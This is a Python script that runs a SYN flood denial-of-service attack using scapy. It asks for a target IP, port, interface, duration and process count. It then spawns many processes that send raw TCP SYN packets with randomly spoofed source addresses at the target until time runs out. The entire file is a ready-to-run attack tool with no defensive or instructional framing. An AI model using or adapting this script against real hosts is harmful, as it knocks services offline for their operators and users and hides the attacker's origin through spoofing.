#!/usr/bin/env python3
# Fast SYN Flood Attack (Denial of Service - DoS)

import random
import time
import os
import signal
import sys
import multiprocessing
from scapy.all import Ether, IP, TCP, ARP, srp, sendp

def get_mac(ip, iface=None):
    """
    Resolve the MAC address for a given IP using an ARP request.
    If iface is provided, it will use that network interface.
    """
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered, _ = srp(arp_request_broadcast, timeout=1, verbose=0, iface=iface)
    if answered:
        return answered[0][1].src
    else:
        print(f"❌ Unable to resolve MAC address for {ip}")
        sys.exit(1)

def generate_spoofed_ip():
    """Generates a random spoofed IPv4 address."""
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def syn_flood_worker(target_ip, target_port, target_mac, iface, running_flag):
    """
    Worker function that continuously sends SYN packets.
    Uses raw Ethernet frames (via sendp) to bypass the need for
    an IP-layer MAC resolution on every packet.
    """
    while running_flag.value:
        try:
            src_ip = generate_spoofed_ip()
            src_port = random.randint(1024, 65535)
            packet = Ether(dst=target_mac) / IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
            sendp(packet, verbose=0, iface=iface)
        except Exception:
            # If an error occurs, we just ignore it to keep sending packets.
            continue

def main():
    if os.getuid() != 0:
        print("❌ This script requires root privileges (sudo).")
        sys.exit(1)

    # Get user input for the attack configuration.
    target_ip = input("Enter target IP address: ").strip()
    target_port = int(input("Enter target port (e.g., 80): ").strip())
    iface = input("Enter network interface (e.g., eth0) [optional]: ").strip() or None
    duration = int(input("Enter attack duration in seconds: ").strip())
    num_processes = int(input("Enter number of processes to spawn (e.g., 100): ").strip())

    print("\nResolving target MAC address...")
    target_mac = get_mac(target_ip, iface)
    print(f"Target MAC address: {target_mac}")

    # Create a shared flag to signal processes to stop.
    manager = multiprocessing.Manager()
    running_flag = manager.Value('i', 1)

    processes = []
    print("\n🚀 Starting SYN Flood Attack...")
    for _ in range(num_processes):
        p = multiprocessing.Process(target=syn_flood_worker,
                                    args=(target_ip, target_port, target_mac, iface, running_flag))
        p.start()
        processes.append(p)

    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            print(f"\rElapsed time: {elapsed:.1f}s", end='', flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 Attack interrupted by user!")
    finally:
        running_flag.value = 0
        for p in processes:
            p.terminate()
            p.join()

    print("\n\n📊 Attack finished.")

if __name__ == "__main__":
    # Set up signal handler for graceful termination.
    signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
    main()
